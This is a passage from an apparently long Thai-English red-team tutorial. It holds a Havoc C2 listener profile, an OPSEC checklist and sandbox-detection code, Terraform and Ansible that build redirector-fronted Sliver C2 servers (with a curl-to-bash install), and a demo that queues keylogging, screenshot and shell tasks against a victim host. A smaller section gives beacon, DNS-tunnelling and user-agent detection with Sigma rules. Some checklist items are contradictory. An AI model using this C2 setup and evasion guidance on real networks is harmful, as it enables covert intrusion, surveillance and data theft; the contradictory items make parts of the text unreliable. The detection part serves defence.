    Port = "{c2_config.get('port', 40056)}"

    Build {{
        Compiler64 = "/usr/bin/x86_64-w64-mingw32-gcc"
        Compiler86 = "/usr/bin/i686-w64-mingw32-gcc"
        Nasm = "/usr/bin/nasm"
    }}
}}

Operators {{
    operator "operator" {{
        Password = "{c2_config.get('password', 'changeme')}"
    }}
}}

Listeners {{
    Http {{
        Name         = "{c2_config.get('listener_name', 'default')}"
        Hosts        = ["{c2_config.get('c2_host', '127.0.0.1')}"]
        HostBind     = "0.0.0.0"
        HostRotation = "round-robin"
        Port         = "{c2_config.get('listener_port', 443)}"
        Secure       = true
        UserAgent    = "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"
        Headers      = [
            "X-Forwarded-For: 127.0.0.1",
            "X-RealIP: 127.0.0.1"
        ]
        Urls         = [
            "/static/js/app.min.js",
            "/api/v1/health",
            "/assets/img/logo.png"
        ]
        Response {{
            Headers = [
                "Content-type: application/octet-stream",
                "X-Content-Type-Options: nosniff"
            ]
        }}
    }}
}}

Demon {{
    Sleep = 10
    Jitter = 25
    
    TrustXForwardedFor = false
    
    Injection {{
        Spawn64 = "C:\\\\Windows\\\\System32\\\\notepad.exe"
        Spawn86 = "C:\\\\Windows\\\\SysWOW64\\\\notepad.exe"
    }}
}}
"""
        return profile
```

## Step 698: OPSEC for C2 Operations

```python
from dataclasses import dataclass, field
from typing import List, Dict, Optional
import ipaddress
import socket
import time
import json


class OPSECChecker:
    """ตรวจสอบ OPSEC สำหรับ C2 operations"""
    
    def check_network_opsec(self) -> List[Dict]:
        """ตรวจสอบ network OPSEC"""
        issues = []
        
        # ตรวจสอบ DNS ของ C2 domain
        import subprocess
        result = subprocess.run(
            ['dig', '+short', 'TXT', '_dmarc.attacker.com'],
            capture_output=True, text=True
        )
        if not result.stdout:
            issues.append({
                'severity': 'high',
                'issue': 'Missing DMARC record on C2 domain',
                'fix': 'Add DMARC, SPF, DKIM records to avoid email-based detection'
            })
        
        # ตรวจสอบ certificate
        import ssl
        try:
            cert = ssl.get_server_certificate(('attacker.com', 443))
            import datetime
            # Check cert age (new certs are suspicious)
            issues.append({
                'severity': 'info',
                'issue': 'Certificate check - ensure cert matches expected domain',
                'fix': 'Use domain-fronting or CDN-backed certificates'
            })
        except Exception:
            issues.append({
                'severity': 'medium',
                'issue': 'C2 domain certificate issue',
                'fix': 'Ensure valid TLS certificate'
            })
        
        return issues
    
    def generate_opsec_checklist(self, operation_type: str = 'red_team') -> List[Dict]:
        """สร้าง OPSEC checklist"""
        checklist = [
            {
                'category': 'Infrastructure',
                'items': [
                    'Use redirectors in front of C2 servers',
                    'Never expose C2 server IP directly',
                    'Use domain fronting where possible',
                    'Purchase infrastructure with anonymous payment',
                    'Use fresh domains (not newly registered - look suspicious)',
                    'Configure CDN to mask origin IP',
                    'Use different IPs for different operations',
                    'Implement strict firewall rules on C2 server'
                ]
            },
            {
                'category': 'C2 Configuration',
                'items': [
                    'Use HTTP/HTTPS over suspicious ports',
                    'Implement sleep/jitter to avoid beaconing detection',
                    'Use legitimate-looking User-Agents',
                    'Mimic legitimate traffic patterns (Amazon, Office365)',
                    'Implement kill switch/kill date',
                    'Use encrypted communications (TLS)',
                    'Rotate C2 domains regularly',
                    'Use DNS-based fallback C2'
                ]
            },
            {
                'category': 'Operational',
                'items': [
                    'Use VPN/Tor for operator connections',
                    'Never access C2 from personal network',
                    'Log all operator actions',
                    'Use timestomping on dropped files',
                    'Clean up artifacts after operations',
                    'Use living-off-the-land techniques',
                    'Avoid noisy tools that trigger EDR',
                    'Test payloads in sandbox before deployment'
                ]
            },
            {
                'category': 'Agent/Implant',
                'items': [
                    'Implement sleep with encrypted communications',
                    'Check for analysis environments (VMs, sandboxes)',
                    'Use process injection into legitimate processes',
                    'Avoid writing to disk when possible',
                    'Clean up memory after execution',
                    'Implement anti-debugging techniques',
                    'Use indirect syscalls',
                    'Implement domain generation algorithms (DGA) as fallback'
                ]
            }
        ]
        
        if operation_type == 'bug_bounty':
            # Bug bounty OPSEC is different
            return [{
                'category': 'Legal/Ethical',
                'items': [
                    'Only test in-scope assets',
                    'Do not access/download PII',
                    'Report findings immediately',
                    'Do not DoS or degrade services',
                    'Keep PoC to minimum needed',
                    'Respect safe harbor provisions'
                ]
            }]
        
        return checklist
    
    def detect_analyst_environment(self) -> Dict:
        """ตรวจหาว่าอยู่ใน sandbox/VM (สำหรับ การพัดนา defense)"""
        indicators = []
        
        # CPU count (สะเท่า sandbox มักมีน้อย)
        import os
        cpu_count = os.cpu_count() or 1
        if cpu_count < 2:
            indicators.append({'type': 'VM/Sandbox', 'detail': f'Only {cpu_count} CPU core'})
        
        # Memory size (sandbox มักมี RAM น้อย)
        try:
            import psutil
            ram_gb = psutil.virtual_memory().total / (1024**3)
            if ram_gb < 4:
                indicators.append({'type': 'VM/Sandbox', 'detail': f'Only {ram_gb:.1f}GB RAM'})
        except ImportError:
            pass
        
        # Known sandbox process names
        try:
            import psutil
            sandbox_processes = [
                'vmsrvc', 'vmusr', 'vmwaretray',  # VMware
                'vboxservice', 'vboxtray',  # VirtualBox
                'wireshark', 'fiddler', 'processhacker',  # Analysis tools
                'cuckoo', 'sandboxie'
            ]
            running = [p.name().lower() for p in psutil.process_iter()]
            for proc in sandbox_processes:
                if proc in running:
                    indicators.append({'type': 'Analysis Tool', 'detail': f'Found: {proc}'})
        except Exception:
            pass
        
        # Check for common VM artifacts
        vm_paths = [
            '/dev/disk/by-id/ata-VBOX_HARDDISK',
            '/sys/class/dmi/id/product_name',
        ]
        for path in vm_paths:
            if os.path.exists(path):
                try:
                    content = open(path).read()
                    if any(vm in content.lower() for vm in ['virtual', 'vmware', 'vbox']):
                        indicators.append({'type': 'VM', 'detail': f'VM artifact: {path}'})
                except Exception:
                    pass
        
        return {
            'is_sandbox': len(indicators) > 0,
            'indicators': indicators,
            'confidence': min(len(indicators) * 20, 100)
        }
```

## Step 699: C2 Detection and Defense

```python
from dataclasses import dataclass, field
from typing import List, Dict, Optional, Tuple
import statistics
import json
import re


class C2DetectionEngine:
    """เครื่องมือตรวจจับ C2 communications"""
    
    def detect_beacon_pattern(self, timestamps: List[float],
                               threshold: float = 0.1) -> Dict:
        """ตรวจหา beaconing pattern จาก timestamps"""
        if len(timestamps) < 10:
            return {'beaconing': False, 'reason': 'Insufficient data'}
        
        # คำนวณ intervals
        intervals = [
            timestamps[i+1] - timestamps[i]
            for i in range(len(timestamps) - 1)
        ]
        
        mean_interval = statistics.mean(intervals)
        std_interval = statistics.stdev(intervals)
        
        # Coefficient of Variation (CV)
        cv = std_interval / mean_interval if mean_interval > 0 else float('inf')
        
        beaconing = cv < threshold
        
        return {
            'beaconing': beaconing,
            'mean_interval': mean_interval,
            'std_interval': std_interval,
            'cv': cv,
            'period_seconds': mean_interval if beaconing else None,
            'confidence': max(0, 1 - cv) * 100
        }
    
    def detect_dns_tunneling(self, dns_queries: List[Dict]) -> List[Dict]:
        """ตรวจหา DNS tunneling"""
        suspicious = []
        
        # Group queries by domain
        domain_queries = {}
        for query in dns_queries:
            domain = query.get('domain', '')
            parts = domain.split('.')
            if len(parts) >= 2:
                base_domain = '.'.join(parts[-2:])
                if base_domain not in domain_queries:
                    domain_queries[base_domain] = []
                domain_queries[base_domain].append(query)
        
        for domain, queries in domain_queries.items():
            # Check for high query volume
            if len(queries) > 100:
                suspicious.append({
                    'domain': domain,
                    'indicator': 'High query volume',
                    'count': len(queries)
                })
            
            # Check for long subdomain labels (encoded data)
            long_labels = [
                q['domain'] for q in queries
                if max(len(p) for p in q['domain'].split('.')) > 30
            ]
            if long_labels:
                suspicious.append({
                    'domain': domain,
                    'indicator': 'Unusually long subdomain labels',
                    'samples': long_labels[:3]
                })
            
            # Check entropy of subdomains
            subdomains = [q['domain'].split('.')[0] for q in queries]
            avg_entropy = statistics.mean(
                self._calculate_entropy(s) for s in subdomains
            )
            if avg_entropy > 3.5:  # High entropy = likely encoded data
                suspicious.append({
                    'domain': domain,
                    'indicator': 'High entropy subdomains',
                    'avg_entropy': avg_entropy
                })
        
        return suspicious
    
    def _calculate_entropy(self, s: str) -> float:
        """Calculate Shannon entropy"""
        import math
        if not s:
            return 0
        
        freq = {}
        for c in s:
            freq[c] = freq.get(c, 0) + 1
        
        entropy = -sum(
            (count/len(s)) * math.log2(count/len(s))
            for count in freq.values()
        )
        return entropy
    
    def detect_c2_user_agents(self, user_agents: List[str]) -> List[Dict]:
        """ตรวจหา C2 User-Agents"""
        suspicious = []
        
        # Known C2 user-agent patterns
        c2_patterns = [
            {'pattern': r'Mozilla/5\.0 \(compatible; MSIE 9\.0.*Trident/5\.0\)', 'c2': 'Cobalt Strike default'},
            {'pattern': r'^$', 'c2': 'Empty user agent'},
            {'pattern': r'^python-requests/', 'c2': 'Python C2 tool'},
            {'pattern': r'curl/[0-9]', 'c2': 'Curl-based implant'},
            {'pattern': r'Go-http-client/', 'c2': 'Go-based C2'},
        ]
        
        for ua in user_agents:
            for pattern in c2_patterns:
                if re.search(pattern['pattern'], ua, re.IGNORECASE):
                    suspicious.append({
                        'user_agent': ua,
                        'suspected_c2': pattern['c2'],
                        'severity': 'high'
                    })
        
        return suspicious
    
    def generate_sigma_rules(self) -> List[str]:
        """สร้าง SIGMA rules สำหรับตรวจจับ C2"""
        rules = []
        
        # Rule 1: DNS Beaconing
        rules.append("""
title: DNS Beaconing Detection
id: a1234567-1234-1234-1234-123456789abc
status: experimental
description: Detects DNS beaconing from potential C2 implants
references:
    - https://attack.mitre.org/techniques/T1071/004/
author: Security Team
date: 2024/01/01
tags:
    - attack.command_and_control
    - attack.t1071.004
logsource:
    category: dns
detection:
    selection:
        dns.question.type: 'A'
    condition: selection | count() by src_ip, dns.question.registered_domain > 100 in 1h
falsepositives:
    - Legitimate high-volume DNS resolvers
level: medium
""")
        
        # Rule 2: Cobalt Strike HTTP beaconing
        rules.append("""
title: Cobalt Strike HTTP Beaconing
id: b2345678-2345-2345-2345-234567890bcd
status: stable
description: Detects Cobalt Strike HTTP beacon traffic patterns
references:
    - https://attack.mitre.org/techniques/T1071/001/
author: Security Team
tags:
    - attack.command_and_control
    - attack.t1071.001
logsource:
    category: proxy
detection:
    selection:
        http.method: POST
        http.uri|contains:
            - '/submit.php'
            - '/pixel'
            - '/ca'
        http.response_size|between: [1, 48]
    timeframe: 1h
    condition: selection | count() by src_ip > 20
falsepositives:
    - Analytics beacons
level: high
""")
        
        return rules
```

## Step 700: Red Team Infrastructure Automation

```python
import subprocess
import json
from dataclasses import dataclass, field
from typing import List, Dict, Optional
from pathlib import Path


class RedTeamInfrastructure:
    """อัตโนมัติการตั้งค่า red team infrastructure"""
    
    def generate_terraform_c2_infra(self, config: Dict) -> str:
        """Terraform config สำหรับ C2 infrastructure"""
        return f"""
# Red Team C2 Infrastructure
# สำหรับการ authorized penetration testing เท่านั้น

provider "aws" {{
  region = "{config.get('region', 'us-east-1')}"
}}

# VPC
resource "aws_vpc" "c2_vpc" {{
  cidr_block           = "10.0.0.0/16"
  enable_dns_hostnames = true
  tags = {{
    Name = "c2-vpc"
    Purpose = "authorized-pentest"
  }}
}}

# Subnet
resource "aws_subnet" "c2_subnet" {{
  vpc_id            = aws_vpc.c2_vpc.id
  cidr_block        = "10.0.1.0/24"
  availability_zone = "{config.get('az', 'us-east-1a')}"
}}

# Security Group - Redirector
resource "aws_security_group" "redirector_sg" {{
  name   = "redirector-sg"
  vpc_id = aws_vpc.c2_vpc.id
  
  ingress {{
    from_port   = 443
    to_port     = 443
    protocol    = "tcp"
    cidr_blocks = ["0.0.0.0/0"]
  }}
  
  ingress {{
    from_port   = 80
    to_port     = 80
    protocol    = "tcp"
    cidr_blocks = ["0.0.0.0/0"]
  }}
  
  egress {{
    from_port   = 0
    to_port     = 0
    protocol    = "-1"
    cidr_blocks = ["0.0.0.0/0"]
  }}
}}

# Security Group - C2 Server (only from redirector)
resource "aws_security_group" "c2_sg" {{
  name   = "c2-server-sg"
  vpc_id = aws_vpc.c2_vpc.id
  
  ingress {{
    from_port       = 443
    to_port         = 443
    protocol        = "tcp"
    security_groups = [aws_security_group.redirector_sg.id]
  }}
  
  # Operator access
  ingress {{
    from_port   = 40056
    to_port     = 40056
    protocol    = "tcp"
    cidr_blocks = ["{config.get('operator_ip', '1.2.3.4')}/32"]
  }}
  
  egress {{
    from_port   = 0
    to_port     = 0
    protocol    = "-1"
    cidr_blocks = ["0.0.0.0/0"]
  }}
}}

# Redirector EC2
resource "aws_instance" "redirector" {{
  ami           = "ami-0c55b159cbfafe1f0"
  instance_type = "t3.micro"
  subnet_id     = aws_subnet.c2_subnet.id
  security_groups = [aws_security_group.redirector_sg.id]
  
  user_data = <<-EOF
              #!/bin/bash
              apt-get update
              apt-get install -y apache2
              a2enmod proxy proxy_http ssl rewrite
              # Setup redirect rules
              EOF
  
  tags = {{
    Name    = "c2-redirector"
    Role    = "redirector"
    Purpose = "authorized-pentest"
  }}
}}

# C2 Server EC2 (private)
resource "aws_instance" "c2_server" {{
  ami           = "ami-0c55b159cbfafe1f0"
  instance_type = "t3.small"
  subnet_id     = aws_subnet.c2_subnet.id
  security_groups = [aws_security_group.c2_sg.id]
  
  user_data = <<-EOF
              #!/bin/bash
              # Install Sliver/Havoc C2
              curl https://sliver.sh/install | sudo bash
              EOF
  
  tags = {{
    Name    = "c2-server"
    Role    = "c2"
    Purpose = "authorized-pentest"
  }}
}}

# Route53 for C2 domain
resource "aws_route53_zone" "c2_zone" {{
  name = "{config.get('c2_domain', 'c2.example.com')}"
}}

resource "aws_route53_record" "c2_a" {{
  zone_id = aws_route53_zone.c2_zone.zone_id
  name    = ""
  type    = "A"
  ttl     = "60"
  records = [aws_instance.redirector.public_ip]
}}

output "redirector_ip" {{
  value = aws_instance.redirector.public_ip
}}

output "c2_private_ip" {{
  value = aws_instance.c2_server.private_ip
}}
"""
    
    def setup_c2_automation(self) -> str:
        """Ansible playbook สำหรับ setup C2 server"""
        return """
---
- name: Setup C2 Infrastructure
  hosts: c2_servers
  become: yes
  
  vars:
    sliver_version: "1.5.41"
    c2_domain: "{{ lookup('env', 'C2_DOMAIN') }}"
  
  tasks:
    - name: Update system
      apt:
        update_cache: yes
        upgrade: yes
    
    - name: Install dependencies
      apt:
        name:
          - curl
          - wget
          - git
          - tmux
          - ufw
        state: present
    
    - name: Configure UFW firewall
      ufw:
        rule: allow
        port: "{{ item }}"
        proto: tcp
      loop:
        - '22'
        - '443'
        - '40056'
    
    - name: Enable UFW
      ufw:
        state: enabled
        policy: deny
    
    - name: Install Sliver C2
      shell: |
        curl -L "https://github.com/BishopFox/sliver/releases/download/v{{ sliver_version }}/sliver-server_linux" \
          -o /usr/local/bin/sliver-server
        chmod +x /usr/local/bin/sliver-server
        /usr/local/bin/sliver-server unpack
    
    - name: Create Sliver systemd service
      copy:
        dest: /etc/systemd/system/sliver.service
        content: |
          [Unit]
          Description=Sliver C2 Server
          After=network.target
          
          [Service]
          Type=simple
          User=sliver
          ExecStart=/usr/local/bin/sliver-server daemon
          Restart=always
          RestartSec=10
          
          [Install]
          WantedBy=multi-user.target
    
    - name: Enable and start Sliver
      systemd:
        name: sliver
        enabled: yes
        state: started
        daemon_reload: yes
"""


if __name__ == '__main__':
    # Demo C2 framework
    c2 = C2Server()
    
    # Register test agent
    agent = c2.register_agent({
        'id': 'abc12345',
        'hostname': 'WORKSTATION-01',
        'username': 'jdoe',
        'os': 'Windows 10',
        'arch': 'x64',
        'ip': '192.168.1.50',
        'external_ip': '203.0.113.10'
    })
    
    # Queue tasks
    c2.issue_command('abc12345', 'shell', {'cmd': 'whoami /all'})
    c2.issue_command('abc12345', 'screenshot', {})
    c2.issue_command('abc12345', 'keylog', {'duration': 60})
    
    print(c2.dashboard())
    
    # Post-exploitation
    post_ex = PostExploitationFramework()
    sys_info = post_ex.system_enumeration()
    print(f"System: {sys_info['hostname']} ({sys_info['os']})")
    print(f"Admin: {sys_info.get('is_admin', False)}")
    
    # OPSEC
    opsec = OPSECChecker()
    sandbox_check = opsec.detect_analyst_environment()
    print(f"Sandbox detected: {sandbox_check['is_sandbox']}")
    
    # C2 Detection (for defenders)
    detector = C2DetectionEngine()
    timestamps = [1000, 1060.2, 1120.1, 1180.3, 1240.0, 1300.2, 1360.1, 1420.3, 1480.0, 1540.1]
    beacon_result = detector.detect_beacon_pattern(timestamps)
    print(f"Beaconing detected: {beacon_result['beaconing']} (CV: {beacon_result['cv']:.3f})")
    
    # Infrastructure
    infra = RedTeamInfrastructure()
    terraform = infra.generate_terraform_c2_infra({
        'region': 'us-east-1',
        'c2_domain': 'c2ops.example.com',
        'operator_ip': '1.2.3.4'
    })
    print(f"Terraform config generated ({len(terraform)} chars)")
```
